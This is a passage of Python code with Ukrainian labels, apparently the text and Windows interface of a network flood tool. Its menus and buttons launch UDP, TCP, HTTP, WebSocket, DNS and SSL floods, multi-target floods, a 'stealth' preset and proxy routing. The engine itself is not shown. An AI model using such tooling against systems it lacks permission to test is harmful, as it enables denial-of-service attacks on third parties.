            ("HTTP Метод",        "http_method",         str),
            ("HTTP URL",          "http_target_url",     str),
            ("WS URL",            "ws_target_url",       str),
            ("DNS IP",            "dns_target_ip",       str),
            ("DNS Домен",         "dns_domain",          str),
            ("SSL Host",          "ssl_target_host",     str),
            ("SSL Port",          "ssl_target_port",     int),
            ("Proxy URL",         "proxy_url",           str),
            ("Автозупинка (сек)","auto_stop_seconds",    int),
            ("Ramp-Up (сек)",     "scheduler_ramp_sec",  int),
            ("Webhook URL",       "webhook_url",         str),
        ]
        self.console.print("[dim](Enter — залишити поточне значення)[/]")
        for label, key, cast in fields:
            cur = cfg.data.get(key, "")
            try:
                new = Prompt.ask(f"  {label}", default=str(cur))
                if new != str(cur):
                    cfg.data[key] = cast(new)
            except (ValueError, TypeError):
                pass
        cfg.save()
        self.console.print("[green]Налаштування збережено.[/]")
        time.sleep(1)

    def _presets_menu(self) -> None:
        self.console.print(
            "\n  Пресети: [cyan]quick[/] / [cyan]medium[/] / [cyan]full[/] / [cyan]stealth[/]"
        )
        name = Prompt.ask("  Введіть назву пресету", default="medium")
        cfg.apply_preset(name)
        self.console.print(f"[green]Пресет '{name}' застосовано.[/]")

    def _export_menu(self) -> None:
        self.console.print("\n  Експорт: [cyan]1[/] CSV  [cyan]2[/] HTML  [cyan]3[/] Зберегти шаблон")
        ch = Prompt.ask("  Вибір", default="1")
        if ch == "1":
            ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
            fp  = str(REPORT_DIR / f"export_{ts}.csv")
            ok  = session_history.export_csv(fp)
            self.console.print(f"[{'green' if ok else 'red'}]CSV: {fp if ok else 'Помилка'}[/]")
        elif ch == "2":
            ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
            fp  = str(REPORT_DIR / f"report_{ts}.html")
            ok  = session_history.export_html(fp)
            self.console.print(f"[{'green' if ok else 'red'}]HTML: {fp if ok else 'Помилка'}[/]")
        elif ch == "3":
            name = Prompt.ask("  Назва шаблону", default="my_profile")
            cfg.save_template(name)
            self.console.print(f"[green]Шаблон '{name}' збережено.[/]")

    def _multi_target_menu(self) -> None:
        self.console.print("\n[bold]Multi-Target Flood[/]")
        self.console.print("[dim]Введіть цілі у форматі IP:PORT, по одній на рядок. Порожній рядок — кінець.[/]")
        targets: List[Tuple[str, int]] = []
        while len(targets) < cfg.data.get("max_targets", 4):
            raw = Prompt.ask(f"  Ціль {len(targets)+1}", default="")
            if not raw.strip():
                break
            try:
                parts = raw.rsplit(":", 1)
                if len(parts) == 2:
                    ip_raw, port_str = parts
                    ip = resolve_hostname(ip_raw) if not is_valid_ip(ip_raw) else ip_raw
                    targets.append((ip, int(port_str)))
                else:
                    self.console.print("[red]Формат: IP:PORT[/]")
            except ValueError:
                self.console.print("[red]Невірний формат.[/]")
        if not targets:
            return
        modes = {"u": EngineMode.UDP_FLOOD, "t": EngineMode.TCP_FLOOD}
        mode_str = Prompt.ask("  Режим (u=UDP, t=TCP)", default="u")
        mode = modes.get(mode_str, EngineMode.UDP_FLOOD)
        engine.start_multi_target(targets, mode)
        self.current_screen = "dashboard"

    def _plugins_menu(self) -> None:
        discovered = plugin_manager.discover()
        if not discovered:
            self.console.print(f"[dim]Немає плагінів у {PLUGINS_DIR}/[/]")
            return
        self.console.print(f"\n[bold]Плагіни:[/] {', '.join(discovered)}")
        name = Prompt.ask("  Ім'я плагіну для завантаження/запуску", default="")
        if not name.strip():
            return
        if name not in plugin_manager.list_loaded():
            plugin_manager.load(name)
        plugin_manager.run_plugin(name, engine)

    def _load_geoip(self) -> None:
        ip = cfg.data.get("target_ip", "8.8.8.8")
        self._geoip = geoip_lookup(ip)
        self._geoip_loading = False

    # ── Run ───────────────────────────────────────────────────────────────
    def run(self) -> None:
        if not self._splash_shown:
            self._show_splash()
            self._splash_shown = True

        with Live(self._current_panel(), refresh_per_second=2, console=self.console) as live:
            while True:
                live.update(self._current_panel())
                self._print_menu()
                try:
                    choice = Prompt.ask("  Команда", default="")
                except (KeyboardInterrupt, EOFError):
                    break
                if not self._handle_input(choice):
                    break
                live.update(self._current_panel())

        if engine.running:
            engine.stop(note="TUI exit")

    def _current_panel(self) -> Any:
        scr = self.current_screen
        if scr == "dashboard":
            return self._render_dashboard()
        elif scr == "settings":
            return self._render_settings_preview()
        elif scr == "history":
            return self._render_history()
        elif scr == "diagnostics":
            return self._render_diagnostics()
        elif scr == "plugins":
            return self._render_plugins()
        elif scr == "stats":
            return self._render_live_stats()
        return self._render_dashboard()


# ─────────────────────────────────────────────────────────────────────────────
# 6. WINDOWS GUI (customtkinter)
# ─────────────────────────────────────────────────────────────────────────────
class ToolTip:
    def __init__(self, widget: Any, text: str) -> None:
        self._widget = widget
        self._text   = text
        self._win:   Optional[Any] = None
        widget.bind("<Enter>", self._show)
        widget.bind("<Leave>", self._hide)

    def _show(self, _event: Any = None) -> None:
        if self._win:
            return
        import tkinter as tk
        x = self._widget.winfo_rootx() + 20
        y = self._widget.winfo_rooty() + 30
        self._win = tk.Toplevel(self._widget)
        self._win.wm_overrideredirect(True)
        self._win.wm_geometry(f"+{x}+{y}")
        tk.Label(
            self._win, text=self._text,
            background="#1e293b", foreground="#e2e8f0",
            relief="solid", borderwidth=1, font=("Consolas", 9),
            wraplength=280, justify="left", padx=6, pady=4,
        ).pack()

    def _hide(self, _event: Any = None) -> None:
        if self._win:
            self._win.destroy()
            self._win = None


class Toast:
    def __init__(self, parent: Any, message: str, status: str = "success") -> None:
        import tkinter as tk
        color = "#22c55e" if status == "success" else \
                "#ef4444" if status == "error"   else "#f59e0b"
        win = tk.Toplevel(parent)
        win.wm_overrideredirect(True)
        w, h = 360, 52
        sx   = parent.winfo_rootx() + parent.winfo_width()  // 2 - w // 2
        sy   = parent.winfo_rooty() + parent.winfo_height() - h - 24
        win.wm_geometry(f"{w}x{h}+{sx}+{sy}")
        win.attributes("-topmost", True)
        win.configure(bg="#1e293b")
        tk.Label(
            win, text=message, bg="#1e293b", fg=color,
            font=("Segoe UI", 11), wraplength=340,
        ).pack(expand=True, fill="both", padx=12)
        win.after(3000, win.destroy)


class WindowsGUI:
    COLORS: Dict[str, Dict[str, str]] = {
        "dark": {
            "bg":          "#0f172a",
            "panel":       "#1e293b",
            "card":        "#0f172a",
            "accent":      "#38bdf8",
            "dl":          "#22c55e",
            "ul":          "#ef4444",
            "tcp":         "#a855f7",
            "http":        "#f59e0b",
            "ping":        "#06b6d4",
            "ws":          "#3b82f6",
            "dns":         "#fb923c",
            "ssl":         "#8b5cf6",
            "multi":       "#f43f5e",
            "text":        "#e2e8f0",
            "text_subtle": "#64748b",
            "border":      "#334155",
            "warning":     "#f59e0b",
            "error":       "#ef4444",
        },
        "light": {
            "bg":          "#f1f5f9",
            "panel":       "#ffffff",
            "card":        "#f8fafc",
            "accent":      "#0284c7",
            "dl":          "#16a34a",
            "ul":          "#dc2626",
            "tcp":         "#9333ea",
            "http":        "#d97706",
            "ping":        "#0891b2",
            "ws":          "#2563eb",
            "dns":         "#ea580c",
            "ssl":         "#7c3aed",
            "multi":       "#e11d48",
            "text":        "#0f172a",
            "text_subtle": "#94a3b8",
            "border":      "#e2e8f0",
            "warning":     "#d97706",
            "error":       "#dc2626",
        },
    }

    FONTS: Dict[str, Tuple[str, int, str]] = {
        "title":  ("Segoe UI", 20, "bold"),
        "h2":     ("Segoe UI", 14, "bold"),
        "h3":     ("Segoe UI", 11, "bold"),
        "body":   ("Segoe UI", 11, "normal"),
        "small":  ("Segoe UI",  9, "normal"),
        "mono":   ("Consolas", 10, "normal"),
        "mono_b": ("Consolas", 11, "bold"),
    }

    _STATUS_DOTS = ["◐", "◓", "◑", "◒"]

    def __init__(self) -> None:
        if not GUI_AVAILABLE:
            raise RuntimeError("GUI недоступний — customtkinter не знайдено.")
        theme = cfg.data.get("theme", "System")
        ctk.set_appearance_mode(theme)
        ctk.set_default_color_theme("blue")

        self.root = ctk.CTk()
        self.root.title(f"{APP_NAME} {VERSION}")
        self.root.geometry("1360x820")
        self.root.minsize(1100, 700)

        self._theme_key  = "dark"
        self._dot_idx    = 0
        self.slider_data: Dict[str, Tuple[Any, Any, int, int]] = {}
        self._graph_dl:   List[float] = [0.0] * 80
        self._graph_ul:   List[float] = [0.0] * 80
        self._iface_bytes_prev: Optional[Tuple[int, int]] = None
        self._iface_t_prev:     Optional[float] = None
        self._geoip: Optional[GeoIPResult] = None
        self._geoip_loading = False

        # Keyboard shortcuts
        self.root.bind("<Control-d>", lambda _e: self.toggle_dl())
        self.root.bind("<Control-u>", lambda _e: self.toggle_udp())
        self.root.bind("<Control-t>", lambda _e: self.toggle_tcp())
        self.root.bind("<Control-h>", lambda _e: self.toggle_http())
        self.root.bind("<Control-p>", lambda _e: self.toggle_ping())
        self.root.bind("<Control-w>", lambda _e: self.toggle_ws())
        self.root.bind("<Control-n>", lambda _e: self.toggle_dns())
        self.root.bind("<Control-l>", lambda _e: self.toggle_ssl())
        self.root.bind("<Escape>",    lambda _e: self._stop_with_note())
        self.root.bind("<Control-s>", lambda _e: self.save_settings())

        self._build_ui()
        self._update_loop()
        self._auto_stop_watcher()

    def gc(self, key: str) -> str:
        return self.COLORS[self._theme_key].get(key, "#ffffff")

    def _detect_theme_key(self) -> str:
        return "light" if ctk.get_appearance_mode().lower() == "light" else "dark"

    def _build_ui(self) -> None:
        self._theme_key = self._detect_theme_key()
        self.root.configure(fg_color=self.gc("bg"))

        # ── Top bar ───────────────────────────────────────────────────────
        top = ctk.CTkFrame(self.root, fg_color=self.gc("panel"), corner_radius=0, height=54)
        top.pack(fill="x", side="top")
        top.pack_propagate(False)

        ctk.CTkLabel(
            top, text=f"⚡ {APP_NAME}",
            font=self.FONTS["title"], text_color=self.gc("accent"),
        ).pack(side="left", padx=20, pady=8)
        ctk.CTkLabel(
            top, text=f"v{VERSION}  [{BUILD_DATE}]",
            font=self.FONTS["small"], text_color=self.gc("text_subtle"),
        ).pack(side="left", padx=0, pady=8)

        self.btn_theme = ctk.CTkButton(
            top, text="🌙 Тема", width=90, height=32,
            font=self.FONTS["small"], command=self._toggle_theme,
            fg_color=self.gc("border"), text_color=self.gc("text"),
            hover_color=self.gc("accent"),
        )
        self.btn_theme.pack(side="right", padx=8, pady=10)

        ctk.CTkLabel(
            top, text=f"[{PLATFORM_STR}]",
            font=self.FONTS["small"], text_color=self.gc("text_subtle"),
        ).pack(side="right", padx=12)

        # ── Tab view ──────────────────────────────────────────────────────
        self.tabs = ctk.CTkTabview(
            self.root,
            fg_color=self.gc("bg"),
            segmented_button_fg_color=self.gc("panel"),
            segmented_button_selected_color=self.gc("accent"),
            segmented_button_selected_hover_color=self.gc("dl"),
            segmented_button_unselected_color=self.gc("panel"),
            text_color=self.gc("text"),
        )
        self.tabs.pack(fill="both", expand=True, padx=10, pady=(6, 10))

        TAB_NAMES = [
            "📊 Dashboard", "⚙️ Налаштування", "📋 Звіти",
            "🔍 Діагностика", "🔌 Плагіни", "📜 Про програму",
        ]
        for tab in TAB_NAMES:
            self.tabs.add(tab)

        self.dashboard_tab = self.tabs.tab("📊 Dashboard")
        self.settings_tab  = self.tabs.tab("⚙️ Налаштування")
        self.reports_tab   = self.tabs.tab("📋 Звіти")
        self.diag_tab      = self.tabs.tab("🔍 Діагностика")
        self.plugins_tab   = self.tabs.tab("🔌 Плагіни")
        self.about_tab     = self.tabs.tab("📜 Про програму")

        self._build_dashboard(self.dashboard_tab)
        self._build_settings(self.settings_tab)
        self._build_reports(self.reports_tab)
        self._build_diagnostics(self.diag_tab)
        self._build_plugins(self.plugins_tab)
        self._build_about(self.about_tab)

    # ── Dashboard Tab ─────────────────────────────────────────────────────
    def _build_dashboard(self, parent: Any) -> None:
        parent.columnconfigure(0, weight=3)
        parent.columnconfigure(1, weight=1)
        parent.rowconfigure(0, weight=0)
        parent.rowconfigure(1, weight=1)

        # ── Control buttons row ───────────────────────────────────────────
        ctrl = ctk.CTkFrame(parent, fg_color=self.gc("panel"), corner_radius=12)
        ctrl.grid(row=0, column=0, columnspan=2, sticky="ew", padx=8, pady=8)

        btn_configs = [
            ("⬇ Download",    self.toggle_dl,   "dl",    "Ctrl+D"),
            ("💥 UDP Flood",   self.toggle_udp,  "ul",    ""),
            ("⚡ TCP Flood",   self.toggle_tcp,  "tcp",   "Ctrl+T"),
            ("🌐 HTTP Flood",  self.toggle_http, "http",  "Ctrl+H"),
            ("📡 Ping Test",   self.toggle_ping, "ping",  "Ctrl+P"),
            ("🔌 WS Flood",    self.toggle_ws,   "ws",    "Ctrl+W"),
            ("🌀 DNS Flood",   self.toggle_dns,  "dns",   "Ctrl+N"),
            ("🔒 SSL Stress",  self.toggle_ssl,  "ssl",   "Ctrl+L"),
            ("⏹ Стоп",        self._stop_with_note, "error", "Esc"),
        ]
        self.mode_buttons: Dict[str, Any] = {}
        for i, (label, cmd, color_key, shortcut) in enumerate(btn_configs):
            btn = ctk.CTkButton(
                ctrl, text=label, command=cmd,
                font=self.FONTS["h3"],
                fg_color=self.gc(color_key),
                hover_color=self.gc("accent"),
                text_color="#ffffff", height=38, corner_radius=8,
            )
            btn.grid(row=0, column=i, padx=4, pady=8, sticky="ew")
            ctrl.columnconfigure(i, weight=1)
            ToolTip(btn, shortcut if shortcut else label)
            self.mode_buttons[color_key] = btn

        # Preset buttons row
        preset_row = ctk.CTkFrame(ctrl, fg_color="transparent")
        preset_row.grid(row=1, column=0, columnspan=9, sticky="ew", padx=6, pady=(0, 6))
        ctk.CTkLabel(
            preset_row, text="Пресет:",
            font=self.FONTS["small"], text_color=self.gc("text_subtle")
        ).pack(side="left", padx=8)
        for pname in PRESETS:
            ctk.CTkButton(
                preset_row, text=pname.capitalize(), width=80, height=26,
                font=self.FONTS["small"],
                fg_color=self.gc("border"), text_color=self.gc("text"),
                hover_color=self.gc("accent"),
                command=lambda n=pname: self._apply_preset_gui(n),
            ).pack(side="left", padx=4)
        ctk.CTkButton(
            preset_row, text="⚙ Авто-тюнінг v2", width=130, height=26,
            font=self.FONTS["small"],
            fg_color=self.gc("border"), text_color=self.gc("text"),
            hover_color=self.gc("accent"),
            command=self._auto_tune_gui,
        ).pack(side="left", padx=4)
        ctk.CTkButton(
            preset_row, text="📋 Шаблони", width=90, height=26,
            font=self.FONTS["small"],
            fg_color=self.gc("border"), text_color=self.gc("text"),
            hover_color=self.gc("accent"),
            command=self._templates_dialog,
        ).pack(side="left", padx=4)

        # ── Left metrics ──────────────────────────────────────────────────
        left = ctk.CTkFrame(parent, fg_color=self.gc("panel"), corner_radius=12)
        left.grid(row=1, column=0, sticky="nsew", padx=(8, 4), pady=4)

        dot_row = ctk.CTkFrame(left, fg_color="transparent")
        dot_row.pack(fill="x", padx=16, pady=(12, 4))
        self.lbl_status_dot = ctk.CTkLabel(
            dot_row, text="●", font=("Segoe UI", 28), text_color=self.gc("text_subtle"),
        )
        self.lbl_status_dot.pack(side="left")
        self.lbl_mode = ctk.CTkLabel(
            dot_row, text="IDLE", font=self.FONTS["title"], text_color=self.gc("accent"),
        )
        self.lbl_mode.pack(side="left", padx=12)
        self.lbl_duration = ctk.CTkLabel(
            dot_row, text="00:00:00", font=self.FONTS["h2"], text_color=self.gc("text_subtle"),
        )
        self.lbl_duration.pack(side="right")

        ctk.CTkLabel(left, text="", height=4).pack()

        def make_metric(parent: Any, label: str, color: str) -> Tuple[Any, Any, Any, Any]:
            f = ctk.CTkFrame(parent, fg_color=self.gc("card"), corner_radius=10)
            f.pack(fill="x", padx=16, pady=4)
            ctk.CTkLabel(
                f, text=label, font=self.FONTS["h3"], text_color=color
            ).grid(row=0, column=0, padx=12, pady=(8, 2), sticky="w")
            lbl_now = ctk.CTkLabel(f, text="0.00 MB/s", font=self.FONTS["mono_b"], text_color=color)
            lbl_now.grid(row=0, column=1, padx=12, pady=(8, 2), sticky="e")
            lbl_max = ctk.CTkLabel(f, text="Max: 0.00", font=self.FONTS["small"], text_color=self.gc("text_subtle"))
            lbl_max.grid(row=1, column=0, padx=12, pady=(0, 4), sticky="w")
            lbl_tot = ctk.CTkLabel(f, text="Total: 0 B", font=self.FONTS["small"], text_color=self.gc("text_subtle"))
            lbl_tot.grid(row=1, column=1, padx=12, pady=(0, 4), sticky="e")
            f.columnconfigure(0, weight=1)
            f.columnconfigure(1, weight=1)
            return lbl_now, lbl_max, lbl_tot, f

        self.lbl_dl_now, self.lbl_dl_max, self.lbl_dl_tot, _ = make_metric(left, "⬇ Download", self.gc("dl"))
        self.lbl_ul_now, self.lbl_ul_max, self.lbl_ul_tot, _ = make_metric(left, "⬆ Upload/Flood", self.gc("ul"))

        # Latency percentile card
        lat_card = ctk.CTkFrame(left, fg_color=self.gc("card"), corner_radius=10)
        lat_card.pack(fill="x", padx=16, pady=4)
        ctk.CTkLabel(lat_card, text="⏱ Латентність", font=self.FONTS["h3"],
                      text_color=self.gc("accent")).pack(anchor="w", padx=12, pady=(8, 2))
        self.lbl_lat_p50 = ctk.CTkLabel(lat_card, text="P50: — мс", font=self.FONTS["body"],
                                         text_color=self.gc("text"))
        self.lbl_lat_p50.pack(anchor="w", padx=12)
        self.lbl_lat_p90 = ctk.CTkLabel(lat_card, text="P90: — мс  P99: — мс",
                                         font=self.FONTS["small"], text_color=self.gc("text_subtle"))
        self.lbl_lat_p90.pack(anchor="w", padx=12, pady=(0, 6))

        # Ping card
        ping_card = ctk.CTkFrame(left, fg_color=self.gc("card"), corner_radius=10)
        ping_card.pack(fill="x", padx=16, pady=4)
        ctk.CTkLabel(ping_card, text="📡 Пінг", font=self.FONTS["h3"],
                      text_color=self.gc("ping")).pack(anchor="w", padx=12, pady=(8, 2))
        self.lbl_ping   = ctk.CTkLabel(ping_card, text="RTT: — мс", font=self.FONTS["body"],
                                        text_color=self.gc("text"))
        self.lbl_ping.pack(anchor="w", padx=12)
        self.lbl_jitter = ctk.CTkLabel(ping_card, text="Jitter: — мс  Loss: —%",
                                        font=self.FONTS["small"], text_color=self.gc("text_subtle"))
        self.lbl_jitter.pack(anchor="w", padx=12, pady=(0, 6))

        # System metrics card
        sys_card = ctk.CTkFrame(left, fg_color=self.gc("card"), corner_radius=10)
        sys_card.pack(fill="x", padx=16, pady=4)
        ctk.CTkLabel(sys_card, text="💻 Система", font=self.FONTS["h3"],
                      text_color=self.gc("accent")).pack(anchor="w", padx=12, pady=(8, 2))
        self.lbl_cpu_ram  = ctk.CTkLabel(sys_card, text="CPU: —  RAM: —", font=self.FONTS["body"],
                                          text_color=self.gc("text"))
        self.lbl_cpu_ram.pack(anchor="w", padx=12)
        self.lbl_threads  = ctk.CTkLabel(sys_card, text="Потоків: 0  Помилок: 0",
                                          font=self.FONTS["small"], text_color=self.gc("text_subtle"))
        self.lbl_threads.pack(anchor="w", padx=12)
        self.lbl_iface    = ctk.CTkLabel(sys_card, text="", font=self.FONTS["small"],
                                          text_color=self.gc("text_subtle"))
        self.lbl_iface.pack(anchor="w", padx=12, pady=(0, 6))

        # Scheduler card
        sched_card = ctk.CTkFrame(left, fg_color=self.gc("card"), corner_radius=10)
        sched_card.pack(fill="x", padx=16, pady=4)
        ctk.CTkLabel(sched_card, text="📅 Планувальник", font=self.FONTS["h3"],
                      text_color=self.gc("accent")).pack(anchor="w", padx=12, pady=(8, 2))
        self.lbl_sched = ctk.CTkLabel(sched_card, text="phase: idle",
                                       font=self.FONTS["small"], text_color=self.gc("text_subtle"))
        self.lbl_sched.pack(anchor="w", padx=12, pady=(0, 6))

        # Auto-stop
        self.lbl_autostop = ctk.CTkLabel(left, text="", font=self.FONTS["small"],
                                          text_color=self.gc("text_subtle"))
        self.lbl_autostop.pack(anchor="w", padx=16, pady=2)
        self.pb_autostop = ctk.CTkProgressBar(left, width=300)
        self.pb_autostop.pack(fill="x", padx=16, pady=(0, 4))
        self.pb_autostop.set(0)

        # Error label
        self.lbl_error = ctk.CTkLabel(left, text="", font=self.FONTS["small"],
                                       text_color=self.gc("error"))
        self.lbl_error.pack(anchor="w", padx=16, pady=(2, 8))

        # ── Right: speed graph ────────────────────────────────────────────
        right = ctk.CTkFrame(parent, fg_color=self.gc("panel"), corner_radius=12)
        right.grid(row=1, column=1, sticky="nsew", padx=(4, 8), pady=4)
        ctk.CTkLabel(right, text="📈 Live Graph", font=self.FONTS["h3"],
                      text_color=self.gc("accent")).pack(anchor="w", padx=12, pady=(10, 4))
        import tkinter as tk
        self.graph_canvas = tk.Canvas(
            right, bg=self.gc("card"), width=280, height=220,
            highlightthickness=0,
        )
        self.graph_canvas.pack(padx=12, pady=4)

    # ── Settings Tab ──────────────────────────────────────────────────────
    def _build_settings(self, parent: Any) -> None:
        scroll = ctk.CTkScrollableFrame(parent, fg_color="transparent")
        scroll.pack(fill="both", expand=True, padx=8, pady=8)

        def section(title: str) -> ctk.CTkFrame:
            lbl = ctk.CTkLabel(scroll, text=title, font=self.FONTS["h2"],
                                text_color=self.gc("accent"))
            lbl.pack(anchor="w", padx=8, pady=(16, 4))
            f = ctk.CTkFrame(scroll, fg_color=self.gc("panel"), corner_radius=10)
            f.pack(fill="x", padx=8, pady=2)
            return f

        def slider_row(parent: Any, label: str, key: str) -> None:
            lo, hi = cfg.get_slider_range(key)
            cur    = int(cfg.data.get(key, lo))
            row    = ctk.CTkFrame(parent, fg_color="transparent")
            row.pack(fill="x", padx=12, pady=4)
            ctk.CTkLabel(row, text=label, font=self.FONTS["body"],
                          text_color=self.gc("text"), width=200).pack(side="left")
            val_lbl = ctk.CTkLabel(row, text=str(cur), font=self.FONTS["mono"],
                                    text_color=self.gc("accent"), width=60)
            val_lbl.pack(side="right")
            sldr = ctk.CTkSlider(row, from_=lo, to=hi, number_of_steps=min(hi - lo, 200),
                                  command=lambda v, k=key, l=val_lbl: self._on_slider(k, v, l))
            sldr.set(cur)
            sldr.pack(side="right", fill="x", expand=True, padx=8)
            self.slider_data[key] = (sldr, val_lbl, lo, hi)

        def entry_row(parent: Any, label: str, key: str, wide: bool = False) -> None:
            row = ctk.CTkFrame(parent, fg_color="transparent")
            row.pack(fill="x", padx=12, pady=4)
            ctk.CTkLabel(row, text=label, font=self.FONTS["body"],
                          text_color=self.gc("text"), width=200).pack(side="left")
            ent = ctk.CTkEntry(row, font=self.FONTS["mono"], width=420 if wide else 260)
            ent.insert(0, str(cfg.data.get(key, "")))
            ent.pack(side="right")
            ent.bind("<FocusOut>", lambda _e, k=key, e=ent: self._on_entry_change(k, e))

        # Threads section
        f = section("🧵 Потоки")
        for lbl, key in [
            ("Threads DL",  "threads_dl"),
            ("Threads UDP", "threads_ul"),
            ("Threads TCP", "threads_tcp"),
            ("Threads HTTP","threads_http"),
            ("Threads WS",  "threads_ws"),
            ("Threads DNS", "threads_dns"),
            ("Threads SSL", "threads_ssl"),
        ]:
            slider_row(f, lbl, key)

        # Packet section
        f2 = section("📦 Пакети та пропускна здатність")
        slider_row(f2, "Розмір пакету (Б)",   "packet_size")
        slider_row(f2, "Ліміт DL (MB/s)",     "bandwidth_limit_dl")
        slider_row(f2, "Ліміт UL (MB/s)",     "bandwidth_limit_ul")
        slider_row(f2, "WS Message Size (Б)", "ws_message_size")

        # Network section
        f3 = section("🌐 Мережа")
        entry_row(f3, "IP Цілі",         "target_ip")
        entry_row(f3, "Порт",            "target_port")
        entry_row(f3, "HTTP Method",     "http_method")
        entry_row(f3, "HTTP URL",        "http_target_url",   wide=True)
        entry_row(f3, "WS URL",          "ws_target_url",     wide=True)
        entry_row(f3, "DNS IP",          "dns_target_ip")
        entry_row(f3, "DNS Домен",       "dns_domain")
        entry_row(f3, "SSL Host",        "ssl_target_host")
        entry_row(f3, "SSL Port",        "ssl_target_port")
        entry_row(f3, "Proxy URL",       "proxy_url",         wide=True)

        # Scheduler section
        f4 = section("📅 Планувальник")
        slider_row(f4, "Авто-стоп (сек)",  "auto_stop_seconds")
        slider_row(f4, "Ramp-Up (сек)",    "scheduler_ramp_sec")

        # Webhook section
        f5 = section("🔔 Webhook")
        entry_row(f5, "Webhook URL",     "webhook_url",       wide=True)

        # Save button
        ctk.CTkButton(
            scroll, text="💾 Зберегти налаштування",
            font=self.FONTS["h3"],
            fg_color=self.gc("dl"), text_color="#ffffff",
            height=40, corner_radius=8,
            command=self.save_settings,
        ).pack(pady=16, padx=8)

    def _on_slider(self, key: str, value: float, label_widget: Any) -> None:
        _, _, lo, hi = self.slider_data[key]
        v = int(clamp(value, lo, hi))
        cfg.data[key] = v
        label_widget.configure(text=str(v))

    def _on_entry_change(self, key: str, entry: Any) -> None:
        val = entry.get().strip()
        try:
            if isinstance(cfg.default.get(key), int):
                cfg.data[key] = int(val)
            else:
                cfg.data[key] = val
        except ValueError:
            pass

    def save_settings(self) -> None:
        cfg.save()
        self.show_toast("Налаштування збережено.", "success")

    # ── Reports Tab ───────────────────────────────────────────────────────
    def _build_reports(self, parent: Any) -> None:
        top = ctk.CTkFrame(parent, fg_color=self.gc("panel"), corner_radius=10)
        top.pack(fill="x", padx=8, pady=8)
        ctk.CTkLabel(top, text="📋 Останні сесії", font=self.FONTS["h2"],
                      text_color=self.gc("accent")).pack(side="left", padx=16, pady=8)
        ctk.CTkButton(top, text="📄 Експорт CSV", width=120, height=30,
                       font=self.FONTS["small"],
                       fg_color=self.gc("border"), text_color=self.gc("text"),
                       hover_color=self.gc("accent"),
                       command=self._export_csv_gui).pack(side="right", padx=8, pady=6)
        ctk.CTkButton(top, text="🌐 Експорт HTML", width=130, height=30,
                       font=self.FONTS["small"],
                       fg_color=self.gc("border"), text_color=self.gc("text"),
                       hover_color=self.gc("accent"),
                       command=self._export_html_gui).pack(side="right", padx=4, pady=6)

        self.reports_frame = ctk.CTkScrollableFrame(parent, fg_color="transparent")
        self.reports_frame.pack(fill="both", expand=True, padx=8, pady=4)
        self._refresh_reports()

    def _refresh_reports(self) -> None:
        for w in self.reports_frame.winfo_children():
            w.destroy()
        for e in session_history.entries[:25]:
            mode  = e.get("mode", "—")
            color = self.gc("dl") if mode == "DOWNLOADING" else self.gc("ul")
            card  = ctk.CTkFrame(self.reports_frame, fg_color=self.gc("card"), corner_radius=8)
            card.pack(fill="x", padx=4, pady=3)
            ts    = e.get("session_end_time", "—")[:19]
            dl    = e.get("avg_download_mbs", 0)
            ul    = e.get("avg_upload_mbs",   0)
            dur   = e.get("duration_seconds",  0)
            err   = e.get("errors_count",      0)
            p99   = e.get("ping_p99_ms", "—")
            note  = e.get("note", "")
            ctk.CTkLabel(
                card,
                text=f"{ts}  |  {mode}  |  {dur:.0f}s  |  DL {dl:.2f} MB/s  UL {ul:.2f} MB/s"
                     f"  |  P99: {p99}мс  |  Err:{err}  {('[' + note[:24] + ']') if note else ''}",
                font=self.FONTS["small"], text_color=color,
                anchor="w",
            ).pack(anchor="w", padx=10, pady=4)

    def _export_csv_gui(self) -> None:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fp = str(REPORT_DIR / f"export_{ts}.csv")
        ok = session_history.export_csv(fp)
        self.show_toast(f"CSV: {fp}" if ok else "CSV: помилка", "success" if ok else "error")

    def _export_html_gui(self) -> None:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fp = str(REPORT_DIR / f"report_{ts}.html")
        ok = session_history.export_html(fp)
        self.show_toast(f"HTML: {fp}" if ok else "HTML: помилка", "success" if ok else "error")

    # ── Diagnostics Tab ───────────────────────────────────────────────────
    def _build_diagnostics(self, parent: Any) -> None:
        frame = ctk.CTkScrollableFrame(parent, fg_color="transparent")
        frame.pack(fill="both", expand=True, padx=8, pady=8)

        ctk.CTkLabel(frame, text="🔍 Системна інформація", font=self.FONTS["h2"],
                      text_color=self.gc("accent")).pack(anchor="w", padx=8, pady=4)
        sysinfo = get_system_info()
        card = ctk.CTkFrame(frame, fg_color=self.gc("panel"), corner_radius=10)
        card.pack(fill="x", padx=8, pady=4)
        for k, v in sysinfo.items():
            row = ctk.CTkFrame(card, fg_color="transparent")
            row.pack(fill="x", padx=12, pady=2)
            ctk.CTkLabel(row, text=k, font=self.FONTS["small"],
                          text_color=self.gc("text_subtle"), width=160, anchor="w").pack(side="left")
            ctk.CTkLabel(row, text=str(v), font=self.FONTS["mono"],
                          text_color=self.gc("text"), anchor="w").pack(side="left", padx=8)

        ctk.CTkLabel(frame, text="🌍 GeoIP", font=self.FONTS["h2"],
                      text_color=self.gc("accent")).pack(anchor="w", padx=8, pady=(12, 4))
        self.lbl_geoip = ctk.CTkLabel(frame, text="Натисніть Lookup для завантаження...",
                                       font=self.FONTS["body"], text_color=self.gc("text_subtle"))
        self.lbl_geoip.pack(anchor="w", padx=16, pady=4)
        ctk.CTkButton(
            frame, text="🔎 GeoIP Lookup", width=140, height=30,
            font=self.FONTS["small"],
            fg_color=self.gc("border"), text_color=self.gc("text"),
            hover_color=self.gc("accent"),
            command=self._geoip_lookup_gui,
        ).pack(anchor="w", padx=16, pady=4)

        ctk.CTkLabel(frame, text="🔗 Dual-Stack", font=self.FONTS["h2"],
                      text_color=self.gc("accent")).pack(anchor="w", padx=8, pady=(12, 4))
        ds = detect_dual_stack(cfg.data.get("target_ip", "8.8.8.8"))
        ctk.CTkLabel(
            frame,
            text=f"IPv4: {'✓' if ds['ipv4'] else '✗'}   IPv6: {'✓' if ds['ipv6'] else '✗'}",
            font=self.FONTS["body"], text_color=self.gc("text"),
        ).pack(anchor="w", padx=16, pady=4)

    def _geoip_lookup_gui(self) -> None:
        ip = cfg.data.get("target_ip", "8.8.8.8")
        self.lbl_geoip.configure(text="Завантаження...")
        def _do():
            geo = geoip_lookup(ip)
            self._geoip = geo
            try:
                self.lbl_geoip.configure(text=str(geo))
            except Exception:
                pass
        threading.Thread(target=_do, daemon=True).start()

    # ── Plugins Tab ───────────────────────────────────────────────────────
    def _build_plugins(self, parent: Any) -> None:
